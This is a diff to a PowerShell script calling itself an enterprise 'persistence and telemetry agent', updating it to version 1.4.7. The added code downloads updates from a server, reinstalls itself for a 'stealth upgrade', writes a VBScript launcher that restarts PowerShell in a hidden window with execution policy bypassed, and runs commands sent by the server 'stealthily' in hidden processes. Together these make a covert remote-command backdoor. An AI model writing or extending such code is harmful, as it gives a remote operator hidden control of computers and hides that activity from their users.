@@ -3,7 +3,7 @@ param(
 )
 
 # Unified Enterprise Agent (UEA)
-# Version: 1.4.6
+# Version: 1.4.7
 # Description: Lightweight persistence and telemetry agent for Unified Manager.
 
 $ErrorActionPreference = "Stop"
@@ -51,7 +51,7 @@ function Get-RobustId {
 try {
     $AgentId = Get-RobustId "UUID"
     $SerialNumber = Get-RobustId "Serial"
-    $Version = "1.4.6"
+    $Version = "1.4.7"
     
     Log-Message "AGENT IDENTIFIED (ROBUST): ID=$AgentId, SERIAL=$SerialNumber"
     Log-Message "Heartbeat interval: 3 seconds"
@@ -201,6 +201,7 @@ try {
                      Log-Message "Update Found (Heartbeat)! Version $($Response.latestVersion). Downloading..."
                      Invoke-WebRequest -Uri "$ServerUrl/api/agent/update" -OutFile "$ScriptPath.new"
                      $UpdateTriggered = $true
+                     $NewVersion = $Response.latestVersion
                 }
 
                 if ($UpdateTriggered) {
@@ -208,6 +209,21 @@ try {
                     Log-Message "Update Applied. Restarting..."
                     Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ScriptPath`""
                     exit
+                }
+                
+                # Auto-update if version mismatch
+                if ($NewVersion -and $NewVersion -ne $Version) {
+                    Log-Message "Version mismatch! Current: $Version, New: $NewVersion"
+                    
+                    # Re-run installation to ensure stealth wrappers are updated
+                    Log-Message "Re-installing agent for stealth upgrade..."
+                    Install-Agent -ForceReinstall | Out-Null
+                    
+                    # Use stealth launcher for the restart
+                    $VbsRestart = "$InstallDir\restart.vbs"
+                    "CreateObject(`"WScript.Shell`").Run `"powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"`"$ScriptPath`"`"`", 0, False" | Out-File -FilePath $VbsRestart -Force -Encoding ascii
+                    Start-Process "wscript.exe" -ArgumentList "`"$VbsRestart`""
+                    Stop-Process -Id $PID
                 }
 
                 if ($Response.commands -and $Response.commands.Count -gt 0) {
@@ -218,12 +234,14 @@ try {
                         try {
                             if ($cmd.type -eq "shell" -or $cmd.type -eq "Run-Script") {
                                 $ScriptToRun = if ($cmd.payload.command) { $cmd.payload.command } else { $cmd.payload.script }
-                                $Result = Invoke-Expression $ScriptToRun | Out-String
                                 
                                 # If the dashboard requested a specific return type, use it for the result
                                 if ($cmd.payload.returnType) { 
                                     $cmd.type = $cmd.payload.returnType 
-                                    Log-Message "Overriding result type to: $($cmd.type)"
+                                    Log-Message "Executing shell command stealthily: $($cmd.payload.command)"
+                                    $Result = powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -Command $cmd.payload.command 2>&1 | Out-String
+                                } else {
+                                    $Result = Invoke-Expression $ScriptToRun | Out-String
                                 }
                             } elseif ($cmd.type -eq "software") {
                                 $Result = Get-Package | Select-Object Name, Version, ProviderName | ConvertTo-Json
